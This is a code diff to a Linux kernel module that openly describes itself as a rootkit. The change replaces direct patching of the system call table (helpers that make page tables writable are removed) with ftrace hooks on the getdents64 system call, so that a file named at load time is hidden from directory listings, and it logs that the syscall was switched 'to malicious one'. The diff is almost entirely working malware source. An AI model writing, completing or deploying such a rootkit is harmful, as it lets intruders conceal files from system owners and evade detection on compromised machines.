@@ -5,6 +5,8 @@
 #include <linux/version.h>
 #include <linux/namei.h>
 #include <linux/dirent.h>
+#include <linux/kallsyms.h>
+
 
 #include "ftrace_helper2.h"
 
@@ -16,54 +18,19 @@ MODULE_DESCRIPTION("a kernel module rootkit");
 MODULE_VERSION("1");
 
 
-//unsigned long (*kallsyms_lookup_name_)(const char *name);
-
-//unsigned long kallsyms_lookup_addr;
-//unsigned long *sys_call_table;
-
-asmlinkage int (*old_getdents64)(const struct pt_regs *regs);
-asmlinkage int new_getdents64(const struct pt_regs *regs);
+static asmlinkage int (*old_getdents64)(const struct pt_regs *regs);
+static asmlinkage int new_getdents64(const struct pt_regs *regs);
 
 static struct ftrace_hook hooks[] = {
- 	HOOK("sys_getdents64",new_getdents64, &old_getdents64),
+ 	HOOK("__x64_sys_getdents64",new_getdents64, &old_getdents64),
  };
 
 char* file_to_hide; 
 
 
-// parameters from command line
-//module_param(kallsyms_lookup_addr, ulong, S_IRUGO);
-//MODULE_PARM_DESC(kallsyms_lookup_addr, "kallsyms_lookup_name(char *path) function address");
 module_param(file_to_hide, charp, 0000);
 MODULE_PARM_DESC(file_to_hide, "file to hide from getdents64 syscall");
 
-
-/* those functions are used for changing the syscalls in the syscall_table*/
-int set_addr_rw(unsigned long _addr) {
-
-        unsigned int level;
-        pte_t *pte;
-
-        pte = lookup_address(_addr, &level);
-
-        if (pte->pte &~ _PAGE_RW) {
-                pte->pte |= _PAGE_RW;
-        }
-
-        return 0;
-}
-// function to change addr page to ro.
-int set_addr_ro(unsigned long _addr) {
-
-        unsigned int level;
-        pte_t *pte;
-
-        pte = lookup_address(_addr, &level);
-        pte->pte = pte->pte &~_PAGE_RW;
-
-        return 0;
-}
-/*---------------------------------------------------------------------------*/
 
 
 static int __init rootkit_enter(void) {
@@ -71,27 +38,11 @@ static int __init rootkit_enter(void) {
 	unsigned int err;
 
 	printk(KERN_INFO "rootkit is operating\n");
-
-	//populate the kallsyms_lookup_name function
-	//kallsyms_lookup_name_ = (void*)kallsyms_lookup_addr;
-
-
-	//find sys_call_table address
-	//sys_call_table=(unsigned long*)kallsyms_lookup_name_("sys_call_table");
-
-
-	// save old getdents64 function
-	//old_getdents64 = sys_call_table[__NR_getdents64];
-
-	//replace it with our custom getdents64
-	// set_addr_rw((unsigned long)sys_call_table);
-	// sys_call_table[__NR_getdents64] = new_getdents64;
-	// set_addr_ro((unsigned long)sys_call_table);
-
 	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+
 	if(err)
 		return err;
-	return 0;
+
 	printk(KERN_INFO "switched getdents64 syscall to malicious one\n");
 
 	return 0;
@@ -99,10 +50,6 @@ static int __init rootkit_enter(void) {
 
 static void __exit rootkit_exit(void) {
 
- //restore old getdents64 syscall
-	// set_addr_rw((unsigned long)sys_call_table);
-	// sys_call_table[__NR_getdents64] = old_getdents64;
-	// set_addr_ro((unsigned long)sys_call_table);
 
 	//remove ftrace hooks
 	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
